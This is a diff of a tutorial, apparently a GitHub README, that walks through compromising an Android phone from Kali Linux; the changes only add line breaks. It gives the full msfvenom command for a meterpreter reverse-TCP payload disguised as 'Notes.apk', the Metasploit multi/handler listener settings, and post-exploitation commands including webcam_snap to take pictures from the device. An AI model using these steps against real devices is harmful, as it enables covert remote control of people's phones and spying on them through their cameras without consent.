@@ -89,7 +89,10 @@ Kali Linux is one of the most-used operating systems for penetration testing.
 Step 1: Starting Kali Linux
 
 •	From our VM, start Kali Linux and log in with our (user ID/password).
-•	Open a terminal and switch user to root For this, we use the following command: Terminal: sudo su
+•	Open a terminal and switch user to root For this, we use the following command: 
+
+Terminal: sudo su
+
 And enter the user password.
 
 •	After changing user to root in the terminal install apktool.
@@ -101,14 +104,19 @@ And enter the user password.
 
  
 
-•	Now check your ip address using the command Terminal: ip r
+•	Now check your ip address using the command 
+
+Terminal: ip r
+
 •	This ip will be useful while assigning the localhost.
 
 <img width="491" alt="image" src="https://user-images.githubusercontent.com/58047550/221259611-28b93ef1-f28d-4786-99ac-1cc1c7c5ba17.png">
 
 
 Step 2: After installing apktool make an exploit for the Android using the MSFvenom tool. For this, we use the following command:
+
 Terminal: msfvenom -a java --platform android -p android/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=8080 -o Notes.apk
+
 <img width="491" alt="image" src="https://user-images.githubusercontent.com/58047550/221259681-0f295a07-3ff1-4954-a78e-7266edac284c.png">
 
 APK file created successfully
@@ -129,11 +137,17 @@ For this, we use the following command: Terminal: msfconsole
 Step 4:
 Now we launch the exploit multi/handler and use the Android payload to listen to the clients.
 Next commands used:
+
 ➢	msf6 > use exploit/multi/handler
+
 ➢	msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+
 ➢	msf6 exploit(multi/handler) > set LHOST 192.168.1.103
+
 ➢	msf6 exploit(multi/handler) > set LPORT 8080
+
 ➢	msf6 exploit(multi/handler) > options
+
 Next, set the options for payload, listener IP (LHOST) and listener PORT(LPORT). We have used localhost IP, port number 8080 and
 payload android/meterpreter/reverse_tcp while creating an .apk file with MSFvenom.
 
@@ -254,7 +268,9 @@ The commands are well categorized according to different domains.
 Our first commmand will be “sysinfo”-
 **sysinfo**
 The ```sysinfo``` command shows you basic information about the Android device.
+
 We got the Meterpreter session of the Android device. We can check more details with the sysinfo command, as mentioned in the below screenshot.
+
 Next command—
 **ifconfig**
 The ```ifconfig``` command displays the network interfaces on the remote machine.
@@ -269,16 +285,24 @@ Display system details
 
 
 Next command:
+
 **getuid**
-The ```getuid``` command shows the current user that the payload is running as: Next command:
+The ```getuid``` command shows the current user that the payload is running as: 
+
+Next command:
 **ps**
-The ```ps``` command shows a list of processes the Android device is running. Next Command:
+The ```ps``` command shows a list of processes the Android device is running. 
+
+Next Command:
 **webcam_list**
 The ```webcam_list``` command shows a list of webcams you could use for the
-```webcam_snap``` command. Next command:
+```webcam_snap``` command. 
+
+Next command:
 **webcam_snap**
 The ```webcam_snap``` command takes a picture from the device. You will have to use the
 ```webcam_list``` command to figure out which camera to use.
+
 <img width="493" alt="image" src="https://user-images.githubusercontent.com/58047550/221260994-3d698758-a8ab-4b1f-95a0-f0b688505f0f.png">
 
 Next Command:
